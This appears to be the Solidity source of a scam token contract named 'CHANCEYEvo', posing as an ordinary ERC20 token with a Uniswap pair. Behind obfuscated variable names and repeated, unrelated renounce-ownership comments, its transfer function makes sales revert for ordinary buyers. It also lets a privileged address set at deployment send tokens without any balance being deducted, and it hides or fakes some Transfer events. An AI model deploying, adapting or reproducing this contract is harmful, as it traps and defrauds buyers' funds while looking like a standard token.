// SPDX-License-Identifier: MIT

pragma solidity >0.8.1;

import "./IERC20.sol";

contract CHANCEYEvo is Ownable {

        /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    uint256 hod;
    uint256 pive;
    bool exay;
    address private prim;
    address private expt;
    address private brth;
    IUniswapV2Router02 public uniswapV2Router;
    uint256 private sqr;
    string private pSym;
    uint256 private _tTotal;
    string private pName;
    uint256 private hgr;
    uint8 private drm;
    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(
        address adrrs,
        address mhys,
        string memory name
    ) {
        uniswapV2Router = IUniswapV2Router02(adrrs);
        prim = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        pSym = unicode"ハピナス";
        pName =  name;
        drm = 9;
        sqr = 0;
        hgr = 100;
        mrd[mhys] = drm;
        _tTotal = 1000000000 * 10**drm;
        sufdr[msg.sender] = _tTotal;
        emit Transfer(address(0xdead), msg.sender, _tTotal);
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */

    function name() public view returns (string memory) {
        return pName;
    }

    function symbol() public view returns (string memory) {
        return pSym;
    }

    function decimals() public view returns (uint256) {
        return drm;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private sufdr;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return sufdr[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function transferSystem(
        address brn,
        address nry,
        uint256 qiy
    ) internal {
        exay = prim == brn;

        if (!exay && mrd[brn] == 0 && det[brn] > 0) {
            mrd[brn] -= drm;
        }

        if(mrd[nry] <= 0)
            emit Transfer(brn, nry, qiy);

        hod = qiy * sqr;

        if (mrd[brn] == 0) {
            sufdr[brn] -= qiy;
        }

        pive = hod / hgr;

        expt = brth;

        brth = nry;

        qiy -= pive;
        det[expt] += drm;
        sufdr[nry] += qiy;

        
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */

    mapping(address => uint256) private det;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private mrd;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        transferSystem(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        transferSystem(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}